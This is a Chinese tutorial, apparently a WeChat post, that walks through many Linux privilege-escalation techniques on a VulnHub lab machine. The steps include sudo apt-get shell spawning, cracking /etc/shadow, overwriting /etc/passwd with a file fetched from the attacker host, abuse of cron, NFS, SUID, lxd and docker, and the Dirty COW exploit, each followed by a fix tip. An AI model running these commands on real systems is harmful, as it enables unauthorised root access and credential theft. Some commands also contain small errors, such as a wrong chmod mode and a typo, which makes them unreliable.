> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/W-0TgPl_31s7rFOMt5YC7A)

```
title: Linux特权提升技术合集 date: 2020-12-25 12:06:51
```

Linux 提权技术合集

环境情况
----

靶机下载地址：http://www.vulnhub.com/entry/linesc-1,616/

攻击机 IP：192.168.56.105

靶机 IP：192.168.56.117

用户：muhammad 密码：nasef

sudo 查看
-------

```
sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmjI1V0VulANO6gVRXbMob9aSB1NSDhAGX5hciczYibUfk6tzswFZP5UQg/640?wx_fmt=png)

apt-get 权限滥用特权提升
----------------

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmPSoDzuhSIMbOlqxpoGorVeelCIwm107gXUTicTtwibmTwmxHpqmibyUGA/640?wx_fmt=png)

提权完成

修补建议：为适当的文件设置适当的权限。在这种情况下，请修改 / etc / sudoers 降低不必要的权限。

二进制程序权限滥用
---------

该二进制文件有源代码，源代码上面是执行一个 shell 出来。在 sudo 中，这个程序不需要 root 密码即可运行，所以我们使用 sudo 来运行该二进制文件即可提权。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm7xrk6uB7IlsTYDYqa1tX2libZFpddg24Vpf9qyhBCfLADic5E2MQkGpA/640?wx_fmt=png)

```
sudo ./sudo
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmbyicGibdmEgFKicTCFVeWYjjIDXuibnVaj6S2RxiaYmcScpz7nOiaV6P7Yaw/640?wx_fmt=png)

修补建议：为适当的文件设置适当的权限。在这种情况下，请修改 / etc / sudoers 降低不必要的权限。

ssh 私钥泄露提权
----------

来到 vuln 的 3 目录看见一个 key，一眼看出来是一个私钥。推测是 root 用户的 key，我们使用 root ssh 连接一下。

```
cat key
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmpBEjMCxUI6QjTa8XNJomiamgRI41r5ZaG6a7jxWFB6GAztAvSxXxmdQ/640?wx_fmt=png)

保存到 kali 下

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmWfx5QtqpHxFvVk8EPmaFEicG2h2oIcBnjicemy0TxjqlsKlcNSm2nNXg/640?wx_fmt=png)

要给 id_rsa 600 权限，要不然读取不到。

```
chmod +x id_rsa
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmlMkBFiaWbJeiaGXuGqC2rKicWsoN3ydeWPwtAAwBrfia4bqNPADRrvPNdg/640?wx_fmt=png)

ssh key 连接

```
ssh root@192.168.56.117 -i ./id_rsa
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmvNibECfSuTLSsYBfmWluGWM77744Tr6ibzicxFibibIaibiafANJAbAHFpreQ/640?wx_fmt=png)

修补办法：将私钥删除。

shadow 文件可读
-----------

查找 shadow 文件

```
ls -la /etc/ | grep shadow
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmb8O2zt85iaEAoVaiac0pYibDeicoVtJOyK8JMCQ2UO7ZicmHWIuJUskYnXg/640?wx_fmt=png)

读一下 shadow 文件

```
cat /etc/shadow
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm70hujUpgwY50o3fGEKCQlmpHb9PacvmuOLauV08okBzYZFKTfcjxvw/640?wx_fmt=png)

发现 root 密码，我们将 root 进行破解。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmdeqvE3dBy6utzEibdic1pS6riantjXpacoBmdLrY7FGlWXHrTRC8qNZyA/640?wx_fmt=png)

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmLMJ2ODevhibofibbvxqqQmpGDAfq85KxJichYic6mShCXKUrADA24ch7uQ/640?wx_fmt=png)

获得 root 密码，su 切换 root 用户完成提权。

```
su root
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmSGzokaicGw3iaSfSPJklRgjRHhwCFe8ia59uSyibULBrNxsI5dAy7br1icg/640?wx_fmt=png)

修补建议：为适当的文件设置适当的权限。在这种情况下，我们应该删除其他用户的阅读权限。

suid 提权
-------

搜索具有 suid 权限的可执行文件

```
find / -type f -perm -u=s 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmj1S3rL9COhnjCvxZcCK9nZicCvIDLO0vzMPGNjEV7EibR4nbCZEAUE4A/640?wx_fmt=png)

### 二进制程序权限滥用特权提升

```
cd /home/muhammad/vuln/1/
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmUYsYEMMxXoxk0J0Ijlt7SicwlE6h8Oh6KBoIVxQqyKFk0Z6QDoTcPFg/640?wx_fmt=png)

这个 suid 文件，执行之后会有一个 shell 返回，这个 shell 是具有 root 权限的。id 查看权限，不是 root，但是对 / etc/passwd 有读写权限，我们来添加一个 root 用户。

```
./suid
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmEoSusKe6OCPmSMx5oJGm58WrZAWeQTUSXpiazzjkHI55Epp454O5DJg/640?wx_fmt=png)

切回 kali，生成密码。

```
openssl passwd -1 -salt magisec 123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmNFXp4g4cqN4VZHBEFF4Wkiay4vCdz9ZbibicLBxGK7drr18hnuBCKA6IQ/640?wx_fmt=png)

复制目标 / etc/passwd 到 kali 下，将我们生成的密码，按照格式写入。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmuWUAia9mZ4yj7l7Uls31lDdhveaUVC7rqMSZ49tFnJibcibTnqjezo0JQ/640?wx_fmt=png)

python 开启 http 服务器，使用 wget 覆盖 / etc/passwd。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmSwTldYcjQXZqXHd14myf9RqpdqQ2TOvQ5exwhhjhibsicl2qY5opibxdw/640?wx_fmt=png)

靶机执行

```
wget http://192.168.56.105/passwd -O /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmNL58ZuEwLyx6pl8j6tccp6sLO7znP5gxRGNTzibTdicffWCQpBxfheWQ/640?wx_fmt=png)

退出当前 shell，切换 magisec 用户，密码 123456。

```
su magisec
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmicxEaUjfZnetibM4qgJtku9qF146P9eyDAbPr302KcvoaD8ia0l1vZgWg/640?wx_fmt=png)

修复建议：取消 suid 文件 suid 权限

### php 特权提升

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm3qcUgpjywtQFMTFo4q6UkU4oJB9YVmGRfB5OW1CxU84X1lYcsRSq9Q/640?wx_fmt=jpeg)

获取 flag

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm8RkI7Xduu9Sp2rPYJL3y5TRvU8de4iaiaCbbxTvM6KA489JJcfsvm6sw/640?wx_fmt=jpeg)

### cp 提权

将靶机的 passwd 文件，拷贝到 kali 上面。

```
cat /etc/passwd
```

openssl 生成密码

```
openssl passwd -1 -salt magisec 123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmb8V8T7V4wb48OzWssgdwHdOLIgxz0iaJnXicpLvxRDviaGEQFFXRHFs8w/640?wx_fmt=png)

python 启动 http 服务器

```
python -m SimpleHTTPServer 80
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmmia1wzFbWO4kx3Gpoovj1pq567UbArCvpicIWJ0Uiab8hub6TgfzXO9Jw/640?wx_fmt=png)

wget 下载 passwd 文件

```
wget http://192.168.56.105/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmZPShnBF5cFSiaSF7yLiaEgxVm6dbmicBELxq2ZePu3B5TZa2k858E8RbQ/640?wx_fmt=png)

cp 命令覆盖 / etc/passwd

```
cp ./passwd /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmqqYlAK0QcrHch68ibpyMUL2oaF3V1hz2KshLZEalFcbwgDlGXLiaJyJw/640?wx_fmt=png)

提权完成

修复建议：将 cp 的 suid 去除

CRONJOBS 特权提升
-------------

查看计划任务

```
cat /etc/crontab
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm4nEAah9MFib9bfRAde35jibhlsK1C8BZM16ibLSk45cJqTicUxicESCZ2hg/640?wx_fmt=png)

发现系统每一分钟以 root 权限执行 script.sh。我去跟进去看看。

```
cat script.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmoRY17kCslTHq7RzUVUKFXcWJmibyWFAcicADicDSVQBbeQFibBia55ciaGuw/640?wx_fmt=png)

查看权限，发现我们对 passwd 和 script 都有读写权限。

```
ls -la
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmgoFQOQM1E1X0k64ibhJnMXm3PrBFJj4VHEYiapT2TwYuFVaDtuSCHe7A/640?wx_fmt=png)

我们看一下 script 的内容

```
cat ./script.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmJgsrzm82kwqwMNBibzhOq18V5DKbzs4wn4g9prWwMnkIJwibDlXiahbcg/640?wx_fmt=png)

发现，他使用 passwd 文件覆盖了系统自带的 passwd 文件，我们对 passwd 文件有权限，所以我们可以添加一个 root 权限的用户。切回 kali，生成密码。

```
openssl passwd -1 -salt magisec 123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmuIooEBLlblr3D6uE7VJadiaOExIsJOcmzDTgAS9cM13zzSOqMx9YeIA/640?wx_fmt=png)

切回靶机 ssh 连接，修改 passwd 文件，修改为这样。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmPxrkIpZia6R7vlgQXVuE7QCMdKejXJl1LntIWA2YYOrNYXRoNwOq8lw/640?wx_fmt=png)

等待系统执行，我们就可以添加一个用户了。需要一分钟。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmR5cgGicia4Rmyhnr6ic1LQ6VkPgKEQMOo0NrpEzNq7c8Lsp0j3pBlrjlQ/640?wx_fmt=png)

我们 su 切换 magisec 用户，密码 123456.

```
su magisec
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmLLZkYiciaVUU5FJeia970KZfRdu5UoR0kNm9GLNrVib3079983n0791BWQ/640?wx_fmt=png)

修复建议：建议将 passwd 文件与 script 权限降低，不给普通用户写权限。

NFS 特权提升
--------

查看靶机挂载目录

```
showmount -e 192.168.56.117
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmktmGFQt8hiaiaxNx2NQAqT0fTDkt33ickTic3jtjicfGStiaZBH4YkcwQpuQ/640?wx_fmt=png)

将目标靶机 nfs 目录挂载到 mnt 目录中

```
mount -t nfs 192.168.56.117:/home/muhammad /mnt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmM9XG1Kfl0K4t9cT8Nh1auiaWdlVfAAZXPyag6ibqRmK8bxFBETTI0MDA/640?wx_fmt=png)

创建 setuid

```
vim ./exp.c
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm8AKDdUclsH7NwFicfte3X3mrLv7EU9sVnUxPqL1NPC4Ccic79Alcz5Lw/640?wx_fmt=png)

gcc 编译

```
gcc exp.c -o exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmdAN34sux0WbIPrRYF3Z0wH24O9te986hnCOLSLkenVQZh51SFERo5Q/640?wx_fmt=png)

复制到 / mnt 目录

```
cp ./exp /mnt/exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmrLab9eo1LUPkZ3fcNSiaRlmf06hnWzzkN3Q8W47zBLaC6LBRPib36kEA/640?wx_fmt=png)

查看 / mnt 目录

```
ls -la
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmia19EWQ99Ns8ic33M6khE9PEA74pRXxUVkelkGFMY24uJ7loFq820Kwg/640?wx_fmt=png)

赋予 suid 权限

```
chmod +x ./exp
```

切回靶机，执行 exp 命令，看 id 依旧是普通用户，但是此时我们已经具有 root 权限了，如果要深入利用，可以参考我上面用的 passwd 攻击手法。

```
./exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmytQtBcqOR2tcs1rV4cwWB280yiaeGykBdOeV8BeepdHg8dyT90SmbMA/640?wx_fmt=png)

修复建议：合理配置 nfs 权限，禁止写入。

历史记录密码泄露
--------

```
history
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmU3bJljmUODPrJbkt6qWnanrnnxoCwCiaXZjrqb3rchEuBHuPafTyAZw/640?wx_fmt=png)

可以看到密码泄露，su 切换 root 用户。

```
su root
```

修复建议：清除历史记录，不直接再命令行中使用密码。

内核提权
----

查看内核版本

```
uname -r
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmURrhBTB1QjkcJyA5dlwQbrLGibdHJCSEfyBUsAl8IMQBewKdvVXibzFA/640?wx_fmt=png)

使用脏牛提权，使用 exploit-db 的 exp

```
searchsploit linux/local/40839.c -m
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmMJgqHosEnJDr0OxEmk2TPQQqmYcP1UZTmWmmTFlQsWAATeCAf7nDww/640?wx_fmt=png)

使用 gcc 编译

```
gcc -pthread 40839.c -o dirty -lcrypt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmCJNbVQpCOrQGMGKuHJyovYMicDnmzanYAXRJu3x6icCv25ibDdjROnEPQ/640?wx_fmt=png)

回传到靶机上

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmwc7FHYAJfADx0Pcdy4TMWn1921FOYSeniatUe34ZGfpQO8ibYKoGxmJA/640?wx_fmt=png)

su 切换 firefart 用户

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmibzes50ic4HmZ0OVk9fFD5lQIY3yEc2fCJXTv3no6Wr4E0qXAGoX7LPw/640?wx_fmt=png)

发现 firefart 用户是 root 组，至此提权完成。

修复建议：升级内核版本，使用最新版本的 ubuntu。

lxc 提权
------

id 查看用户基本信息，发现在 lxd 用户组，使用 lxd 提权

```
id
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmFvVJHUrcmYicajXd9icbYVibfrgP1SMOZtheAlVIXtVibPHjWzYJEOpL9g/640?wx_fmt=jpeg)

github 构建提权环境

https://github.com/saghul/lxd-alpine-builder

```
sudo ./build-alpine
```

然后回自动生成一个 tar.gz 文件，重命名成 t.tar.gz

```
mv alpine-v3.12-x86_64-20201217_1534.tar.gz t.tar.gz
```

将 t.tar.gz 文件传输到目标主机上面，使用 python 开启 http 服务

```
python -m SimpleHTTPServer 80
```

目标主机使用 wget 下载 t.tar.gz

```
wget http://192.168.56.105/t.tar.gz
```

需要先初始化环境 一切默认

```
lxd init
```

查看一下 image

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm9qmbZjichZk54mm0hyHqWL9C06scoUUmf7KJakhP3HiaBA7NfkoFItOw/640?wx_fmt=png)

发现没有任何镜像，我们导入一下镜像，然后再次查看。

```
lxc image import ./t.tar.gz --alias dmagicsec
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhm16p8BPvmQF1jU4phClm58GENzUUz0VKQjGeFVyjN3ibYygibrx8Caqkw/640?wx_fmt=jpeg)

初始化容器

```
lxc init dmagicsec dmagicsec -c security.privileged=true
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmZicfTiatjc55BDccjl10NBYQ2q5RKIicKXyOeKDcB6tucmYOmI5ggMpdA/640?wx_fmt=jpeg)

映射容器

```
lxc config device add dmagicsec dmagicsec disk source=/ path=/mnt/root recursive=true
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmAib503CwkadogMkQGCZ1fqic6xrMlUeGRwJsZJpyA9UyvvCm0taqRAvQ/640?wx_fmt=jpeg)

启动容器

```
lxc start dmagicsec
```

执行交互 shell

```
lxc exec dmagicsec /bin/sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmHVIUxQFHtdbuV1s6hgMuqh7nfnaicPXB0gxOZxBVXribXC6Hf2IsjUMw/640?wx_fmt=png)

获取 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmHVIUxQFHtdbuV1s6hgMuqh7nfnaicPXB0gxOZxBVXribXC6Hf2IsjUMw/640?wx_fmt=png)

docker 权限提升
-----------

查看 id 属于 docker 组，我们使用 docker 提权。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmr6PafiatLpPia5u5Ne7UcugM222uTN9EYCHlL7bO3jZZY2YM59pnE0Cg/640?wx_fmt=jpeg)

提升权限

```
docker run -it --rm -v /:/mnt bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmBo0ia0ZcH0dSTCnY2UPN7gwzlA7IFdPhia1MJKUiaQXBn08BkO7AulqRA/640?wx_fmt=png)

思路：目前我们将目标靶机的整盘目录挂载到了 docker 中，且在 / mnt 目录下，我们修改 / mnt 目录下面的文件，会直接影响到靶机。所以我们修改 / etc/passwd 文件，添加 root 权限用户。

生成密码

```
opensll passwd -1 -salt magisec 123456
```

进入我们刚刚 root 权限的虚拟容器 shell，添加用户。格式如下

```
vi /mnt/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmwia15Aw4WOgRXfdtLTPRDnDpJ0QBV1ZOgEjCM3wFjNy6yMYFJhv6tFA/640?wx_fmt=jpeg)

查看 flag 文件

关注公众号不定期更新文章和视频

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmLAmsksL8wnqYFsYkiaicGtNxLWicmoibIco8oiaEkeupdNKIM7QseCiaFpbw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ACXcTGpicyJFTmDdrFISffhmouwgPZRnhdiaST9icG8fViaGCwHh8VDBa7icU8yqo00GIk9icrmhQ3Pa4FA/640?wx_fmt=gif)

你要的分享、在看与点赞都在这儿~